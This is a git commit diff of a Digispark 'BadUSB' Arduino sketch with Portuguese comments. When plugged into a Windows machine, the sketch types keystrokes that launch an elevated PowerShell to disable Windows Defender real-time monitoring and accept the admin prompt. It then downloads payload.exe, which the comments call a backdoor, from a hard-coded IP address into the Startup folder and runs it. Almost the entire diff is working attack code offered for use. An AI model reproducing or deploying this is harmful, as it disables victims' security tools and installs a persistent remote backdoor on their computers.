c52f566bb934ca224dbfeb49e00123882f737977
Matheus <mattbmoller@gmail.com>
2020-02-13 17:22:38 -0300

    Update payload.ino

--- payload.ino
+++ payload.ino
@@ -26,55 +26,65 @@ void digiEnd() {
   }
 }
 
+void disabledWindowsDefender(){
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(1000);
+  // Iniciar uma instância do PowerShell elevada que desabilitará o Windows Defender
+  printText(F("powershell start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+}
+
+
+void download(){
+  // Fazer o download o backdoor para a pasta de inicialização do windows
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(900);
+  printText(F("powershell  $source = 'http://34.97.212.80/payload.exe'; $destination =  '%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe'; Invoke-WebRequest $source -OutFile $destination;")); 
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+}
+
+void runBackdoor(){
+  //tentar iniciar o backdoor
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(1000);
+  printText(F("%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe"));
+  //powershell start-process
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+}
+
 void printText(fstr_t *txt) {
   DigiKeyboard.print(txt);
   DigiKeyboard.update();
 }
 
  
-
-void setup() {
-  digiBegin();
-
-  DigiKeyboard.delay(200);
-  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
-
-  ///desabilitar windows defender
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(200);
-  // Iniciar uma instância do PowerShell elevada que desabilitará o Windows Defender
-  printText(F("powershell start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs"));
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(2000);
-  
+void yesAdmin(){
   // se você precisar de administrador [esquerda, digite e atrase 1000]
   DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
   DigiKeyboard.delay(1000); 
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
-  //  digiEnd();
   ////////////////////////////////////////////////////////////////////////
+}
 
-  // Você pode remover esta linha de atraso no começo (eu prefiro tê-la apenas por precaução)
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  // Altere esse valor dependendo do computador que você está usando (ou seja, lento ou não)
-  DigiKeyboard.delay(900);
-  printText(F("powershell  $source = 'http://34.97.212.80/payload.exe'; $destination =  '%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe'; Invoke-WebRequest $source -OutFile $destination;")); 
-   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(5000);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(1000);
-  printText(F("start-process %AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe"));
-  //powershell start-process
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(900);
+void setup() {
+  digiBegin();
+ 
+
+  disabledWindowsDefender();
+  download();
+  runBackdoor();
+  yesAdmin();
+  
   printText(F("exit"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(900);
-  DigiKeyboard.sendKeyStroke(KEY_B, MOD_GUI_LEFT);
+  
   digiEnd();
 }
 
